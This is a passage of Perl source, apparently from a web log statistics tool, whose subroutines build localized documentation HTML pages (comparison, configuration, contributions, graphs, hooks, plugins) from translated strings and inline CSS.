td:nth-child(3):contains("1"){font-weight:600;color:#dc2626}.benchmark-table tr:last-child td{background-color:var(--important-bg);font-weight:500;text-align:center;font-style:italic}.benchmark-table td br + span{font-size:0.9em;opacity:0.8}.table-notes{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.table-notes p{margin:8px 0;font-size:0.9em}.table-notes p.warning{color:#dc2626;font-weight:600;background-color:var(--warning-bg);padding:8px 12px;border-radius:6px;border-left:4px solid #dc2626}.benchmark-details{background-color:var(--header-bg);padding:20px;border-radius:12px;margin:20px 0;border:1px solid var(--border-color);display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:15px}.benchmark-details p{margin:0;padding:8px;background-color:var(--bg-color);border-radius:6px}.benchmark-details p strong{color:var(--link-color);margin-right:8px}.important-list{list-style:none;padding:0}.important-list li{margin:12px 0;padding:12px 15px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.important-list li.warning{border-left-color:#dc2626;background-color:var(--warning-bg)}.important-list li b{color:var(--link-color)}.dns-content{background-color:var(--warning-bg);padding:20px;border-radius:12px;margin:20px 0;border:1px solid var(--warning-border)}.dns-content p{margin:0;font-size:1.05em}.dns-content b{color:#dc2626;font-size:1.2em}.advices-list{list-style:none;padding:0}.advices-list li{margin:15px 0;padding:15px 20px;background-color:var(--header-bg);border-radius:10px;border:1px solid var(--border-color);transition:transform 0.2s,box-shadow 0.2s}.advices-list li:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.advices-list li b{color:var(--link-color)}.star{color:var(--star-color);font-size:1.2em;letter-spacing:2px;margin-right:10px}.note{font-size:0.9em;color:var(--text-color);opacity:0.8;margin-top:10px;font-style:italic}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em;border:1px solid var(--border-color)}\@media (max-width:768px){.benchmark-table{display:block;overflow-x:auto;white-space:nowrap}.benchmark-details{grid-template-columns:1fr}.advices-list li{padding:12px}}
	</style>
	<h1>$doc_title</h1>
	<div class="note">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 compare 文档页面 (完整版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_compare_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.compare.title");
	my $subtitle = _t("docs.compare.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $compare_table = _t("compare.table.full");
	my $note_browsers = _t("compare.note.browsers");
	my $note_robots = _t("compare.note.robots");
	my $note_searchengines = _t("compare.note.searchengines");
	my $note_benchmark = _t("compare.note.benchmark");
	my $note_visitors = _t("compare.note.visitors");
	my $note_data = _t("compare.note.data");
	my $note_logformat = _t("compare.note.logformat");
		$note_logformat =~ s/\\n/\n/g;
		$note_logformat =~ s/\\\$/\$/g;
	my $footer_author = _t("compare.footer.author");
	my $footer_twitter = _t("compare.footer.twitter");
	my $footer_sponsor = _t("compare.footer.sponsor");
	my $apache_common_note = _t("compare.value.apache.common.note");
	my $scheduler_common = _t("compare.value.scheduler.common");
	my $benchmark_dns = _t("compare.value.benchmark.dns");
	my $visits_basis = _t("compare.value.visits.basis");
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	.compare-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:0.95em;border:1px solid var(--border-color);border-radius:12px;overflow:hidden}.compare-table th{background-color:var(--table-header-bg);color:var(--text-color);padding:12px 8px;text-align:center;font-weight:600;border:1px solid var(--border-color)}.compare-table td{border:1px solid var(--border-color);padding:10px 8px;vertical-align:top}.compare-table tr:nth-child(even){background-color:var(--header-bg)}.compare-table tr:hover{background-color:var(--border-color)}.feature-left{font-weight:600;text-align:left;background-color:var(--header-bg);white-space:nowrap}.feature-yes{color:#059669;font-weight:600}.feature-no{color:#dc2626;font-weight:600}.note-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.note-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.note-section ul{margin:0;padding:0;list-style:none}.note-section li{margin:15px 0;padding:12px 20px 12px 40px;line-height:1.6;font-size:0.95em;position:relative;border-radius:8px;transition:transform 0.2s}.note-section li:hover{transform:translateX(5px)}.note-browsers{background-color:rgba(59,130,246,0.1);border-left:4px solid #3b82f6}.note-browsers::before{content:"*";color:#3b82f6;font-weight:bold;font-size:1.5em;position:absolute;left:15px;top:10px}.note-robots{background-color:rgba(16,185,129,0.1);border-left:4px solid #10b981}.note-robots::before{content:"**";color:#10b981;font-weight:bold;font-size:1.2em;position:absolute;left:12px;top:12px}.note-searchengines{background-color:rgba(245,158,11,0.1);border-left:4px solid #f59e0b}.note-searchengines::before{content:"***";color:#f59e0b;font-weight:bold;font-size:1.2em;position:absolute;left:12px;top:12px}.note-benchmark{background-color:rgba(239,68,68,0.1);border-left:4px solid #ef4444}.note-benchmark::before{content:"****";color:#ef4444;font-weight:bold;font-size:1.1em;position:absolute;left:10px;top:12px}.note-visitors{background-color:rgba(139,92,246,0.1);border-left:4px solid #8b5cf6}.note-visitors::before{content:"*****";color:#8b5cf6;font-weight:bold;font-size:1.1em;position:absolute;left:8px;top:12px}.note-data{background-color:rgba(236,72,153,0.1);border-left:4px solid #ec4899}.note-data::before{content:"(a)";color:#ec4899;font-weight:bold;font-size:1.1em;position:absolute;left:12px;top:12px}.note-logformat{background-color:rgba(168,85,247,0.1);border-left:4px solid #a855f7}.note-logformat::before{content:"(b)";color:#a855f7;font-weight:bold;font-size:1.1em;position:absolute;left:12px;top:12px}[data-theme="dark"] .note-browsers{background-color:rgba(59,130,246,0.2)}[data-theme="dark"] .note-robots{background-color:rgba(16,185,129,0.2)}[data-theme="dark"] .note-searchengines{background-color:rgba(245,158,11,0.2)}[data-theme="dark"] .note-benchmark{background-color:rgba(239,68,68,0.2)}[data-theme="dark"] .note-visitors{background-color:rgba(139,92,246,0.2)}[data-theme="dark"] .note-data{background-color:rgba(236,72,153,0.2)}[data-theme="dark"] .note-logformat{background-color:rgba(168,85,247,0.2)}:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--table-header-bg:#e5e7eb;--table-border:#d1d5db;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--star-color:#fbbf24}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--table-header-bg:#2d3748;--table-border:#4b5563;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--star-color:#fbbf24}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}h1{font-size:2em}h2{font-size:1.5em;margin-top:30px}h3{font-size:1.3em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}li pre{background-color:var(--code-bg);padding:16px;border-radius:8px;border:1px solid var(--border-color);margin:15px 0;transition:all 0.3s ease;width:calc(100% - 32px);margin-left:0;margin-right:0;white-space:pre;overflow-x:auto;overflow-y:hidden;-webkit-overflow-scrolling:touch}li pre:hover{transform:translateY(-2px);box-shadow:0 4px 8px rgba(0,0,0,0.1);border-color:var(--accent)}li pre code{white-space:pre;display:inline-block;min-width:100%;font-family:'Courier New',monospace;font-size:0.9em;line-height:1.5}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color)}.warning-box{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0}.compare-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:0.95em}.compare-table th{background-color:var(--table-header-bg);border:1px solid var(--table-border);padding:12px 8px;text-align:center;font-weight:600}.compare-table td{border:1px solid var(--table-border);padding:10px 8px;vertical-align:top}.compare-table tr:nth-child(even){background-color:var(--header-bg)}.compare-table tr:hover{background-color:var(--border-color)}.note{font-size:0.9em;color:var(--text-color);opacity:0.8;margin-top:10px}.advice-item{margin:15px 0;padding:10px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.star{color:var(--star-color);font-size:1.2em}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<p class="note">$subtitle</p>
	
	<div class="section">
		$compare_table
	</div>
	
	<div class="note-section">
		<ul>
			<li class="note-browsers">$note_browsers</li>
			<li class="note-robots">$note_robots</li>
			<li class="note-searchengines">$note_searchengines</li>
			<li class="note-benchmark">$note_benchmark</li>
			<li class="note-visitors">$note_visitors</li>
			<li class="note-data">$note_data</li>
			<li class="note-logformat">$note_logformat</li>
		</ul>
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 config 文档页面 (时间线版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_config_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.config.title");
	my $subtitle = _t("docs.config.subtitle");
	my $note = _t("docs.config.note");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $config_full = _t("config.full");
	$config_full =~ s/\\n/\n/g;
	# 获取语言和方向
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--timeline-color:#3b82f6;--section-core:#8b5cf6;--section-optional:#10b981;--section-accuracy:#f59e0b;--code-bg:#f1f5f9;--version-badge:#6b7280;--card-bg:#ffffff;--accent:#2563eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--timeline-color:#60a5fa;--section-core:#a78bfa;--section-optional:#34d399;--section-accuracy:#fbbf24;--code-bg:#2d3748;--version-badge:#9ca3af;--card-bg:#1f2937;--accent:#60a5fa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1400px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--timeline-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:20px;font-size:1.1em}.note{background-color:var(--header-bg);border-left:4px solid var(--timeline-color);padding:15px;border-radius:8px;margin:20px 0}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.timeline{position:relative;padding:20px 0}.timeline::before{content:'';position:absolute;left:200px;top:0;bottom:0;width:2px;background:var(--timeline-color);opacity:0.3}.section-core,.section-optional,.section-accuracy{margin:40px 0 20px 220px;font-size:1.5em;font-weight:700;padding-bottom:8px;border-bottom:2px solid}.section-core{border-color:var(--section-core);color:var(--section-core)}.section-optional{border-color:var(--section-optional);color:var(--section-optional)}.section-accuracy{border-color:var(--section-accuracy);color:var(--section-accuracy)}.config-item{position:relative;margin-bottom:30px;padding-left:220px;min-height:80px}.config-version{position:absolute;left:10px;width:170px;text-align:right;font-weight:600;color:var(--timeline-color);font-size:0.9em;top:20px;padding-right:10px;white-space:normal;word-wrap:break-word;line-height:1.4;background:transparent}.config-marker{position:absolute;left:197px;width:12px;height:12px;border-radius:50%;background:var(--timeline-color);border:2px solid var(--bg-color);box-shadow:0 0 0 2px var(--timeline-color);z-index:2;top:20px}.config-content{background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;padding:20px;transition:transform 0.2s,box-shadow 0.2s;margin-left:0}.config-content:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.config-name{font-size:1.3em;font-weight:700;color:var(--timeline-color);margin-bottom:10px}.config-desc{margin:10px 0}.config-desc ul{margin:5px 0 10px 0;padding-left:20px}.config-desc li{margin:3px 0}.config-example{background:var(--code-bg);padding:8px 12px;border-radius:6px;font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:8px 0;border:1px solid var(--border-color)}.config-default{background:var(--code-bg);padding:6px 10px;border-radius:6px;font-size:0.9em;margin:5px 0;border:1px solid var(--border-color);display:inline-block}.section{margin:40px 0;padding:25px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--bg-color);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.donate-button{display:inline-flex;align-items:center;gap:8px;background:var(--link-color);color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:1em;transition:opacity 0.2s}.donate-button:hover{opacity:0.9}\@media (max-width:768px){.timeline::before{left:120px}.config-item{padding-left:140px}.config-version{left:5px;width:100px;font-size:0.8em}.config-marker{left:117px}.section-core,.section-optional,.section-accuracy{margin-left:140px}}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div class="note">$note</div>
	<div class="timeline">
		$config_full
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 contrib 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_contrib_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.contrib.title");
	my $subtitle = _t("docs.contrib.subtitle");
	my $content = _t("docs.contrib.content");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	
	# 获取语言和方向
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--plugin-standard:#3b82f6;--plugin-geoip:#10b981;--contrib-bg:#fef3c7;--related-bg:#dbeafe;--doc-bg:#e0f2fe;--sponsor-bg:#fae8ff}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--plugin-standard:#60a5fa;--plugin-geoip:#34d399;--contrib-bg:#5f4c1e;--related-bg:#1e3a5f;--doc-bg:#0b5e6b;--sponsor-bg:#4a1e4a}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px;font-size:1.5em}.section h3{margin:20px 0 10px;color:var(--link-color);font-size:1.2em}.plugin-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:20px;margin:20px 0}.plugin-card{background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;padding:15px;transition:transform 0.2s,box-shadow 0.2s}.plugin-card:hover{transform:translateY(-2px);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.plugin-card ul{margin:0;padding:0;list-style:none}.plugin-card li{margin:8px 0;padding-left:20px;position:relative}.plugin-card li::before{content:"•";color:var(--link-color);font-weight:bold;position:absolute;left:4px}.plugin-card li:first-child{margin-top:0}.plugin-card li strong{color:var(--link-color)}.plugin-card.code-block{background-color:var(--code-bg);font-family:monospace;padding:10px;border-radius:4px;margin:10px 0}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:600;margin-right:5px}.badge.standard{background-color:var(--plugin-standard);color:white}.badge.geoip{background-color:var(--plugin-geoip);color:white}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:15px;border-radius:4px;margin:15px 0}.info-box ul,.info-box ol{margin:5px 0;padding-left:20px}.info-box li{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}\@media (max-width:768px){.plugin-grid{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	
	$content
	
	<div id="sponsor" class="section">
		$SPONSOR_SECTION
	</div>
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 devgraphs 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devgraphs_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.devgraphs.title");
	my $subtitle = _t("docs.devgraphs.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $intro = _t("devgraphs.intro");
	my $variables_title = _t("devgraphs.variables.title");
	my $variables_desc = _t("devgraphs.variables.desc");
	my $devgraphs_variables = _t("devgraphs.variables.list");
	my $devgraphs_types = _t("devgraphs.types.list");
	
	# 获取语言和方向
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-title:#3b82f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-title:#60a5fa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;color:var(--section-title);border-bottom:1px solid var(--border-color);padding-bottom:10px;font-size:1.5em}.section h3{margin:20px 0 10px;color:var(--link-color);font-size:1.2em}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:15px;border-radius:4px;margin:15px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.variable-list{list-style:none;padding:0;margin:0}.variable-list li{margin:20px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.variable-list li:hover{transform:translateX(5px);box-shadow:0 2px 8px rgba(0,0,0,0.1)}.variable-list li strong{color:var(--link-color);font-size:1.1em}.type-list{list-style:none;padding:0;margin:0;display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:15px}.type-list li{padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.type-list li:hover{transform:translateY(-2px);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.type-list li strong{color:var(--link-color);font-size:1.1em}.type-list ul{margin:10px 0 0;padding-left:20px}.type-list ul li{padding:3px 0;background:none;border:none}.type-list ul li:hover{transform:none;box-shadow:none}pre{background-color:var(--code-bg);padding:10px;border-radius:4px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:'Monaco','Menlo',monospace}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.type-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<link href="scripts/prettify.css" type="text/css" rel="stylesheet">
	<body onload="prettyPrint()">
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	
	<!-- === 介绍 === -->
	<div class="section">
		<div class="info-box">
			$intro
		</div>
	</div>
	
	<!-- === 变量说明 === -->
	<div class="section">
		$devgraphs_variables
	</div>
	
	<!-- === 图形类型 === -->
	<div class="section">
		$devgraphs_types
	</div>
		
	<hr>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
	<script src="scripts/prettify.js"></script>
$theme_script
</body>
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 devhooks 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devhooks_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.devhooks.title");
	my $subtitle = _t("docs.devhooks.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $devhooks_full = _t("devhooks.full");
	$devhooks_full =~ s/\\n/\n/g;
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-required:#3b82f6;--section-common:#10b981;--section-processing:#f59e0b;--section-output:#8b5cf6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-required:#60a5fa;--section-common:#34d399;--section-processing:#fbbf24;--section-output:#a78bfa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.section-required h2{border-color:var(--section-required);color:var(--section-required)}.section-common h2{border-color:var(--section-common);color:var(--section-common)}.section-processing h2{border-color:var(--section-processing);color:var(--section-processing)}.section-output h2{border-color:var(--section-output);color:var(--section-output)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.hook-list{list-style:none;padding:0;margin:0}.hook-list > li{margin:20px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s,box-shadow 0.2s}.hook-list > li:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.hook-list > li > strong{color:var(--link-color);font-size:1.2em;display:block;margin-bottom:10px}.hook-list ul{margin:10px 0 0;padding-left:20px;list-style:disc}.hook-list ul li{margin:5px 0;padding:0;background:none;border:none}.hook-list ul li:hover{transform:none;box-shadow:none}pre{background-color:var(--code-bg);padding:12px;border-radius:6px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:10px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:'Monaco','Menlo',monospace}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.doc-nav{flex-direction:column;gap:5px}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	
	<div class="container">
		$devhooks_full
	</div>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 devplugins 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devplugins_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.devplugins.title");
	my $subtitle = _t("docs.devplugins.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $intro = _t("devplugins.intro");
	my $nav_location = _t("devplugins.nav.location");
	my $nav_hooks = _t("devplugins.nav.hooks");
	my $nav_variables = _t("devplugins.nav.variables");
	my $nav_accessible_vars = _t("devplugins.nav.accessible_vars");
	my $nav_accessible_funcs = _t("devplugins.nav.accessible_funcs");
	my $location_title = _t("devplugins.location.title");
	my $location_content = _t("devplugins.location.content");
	   $location_content =~ s/\\n/\n/g;
	my $hooks_title = _t("devplugins.hooks.title");
	my $hooks_content = _t("devplugins.hooks.content");
	my $variables_title = _t("devplugins.variables.title");
	my $devplugins_variables = _t("devplugins.variables.full");
	$devplugins_variables =~ s/\\n/\n/g;
	my $accessible_vars_title = _t("devplugins.accessible_vars.title");
	my $accessible_vars_content = _t("devplugins.accessible_vars.content");
	 $accessible_vars_content =~ s/\\n/\n/g;
	my $accessible_funcs_title = _t("devplugins.accessible_funcs.title");
	my $devplugins_functions = _t("devplugins.functions.full");
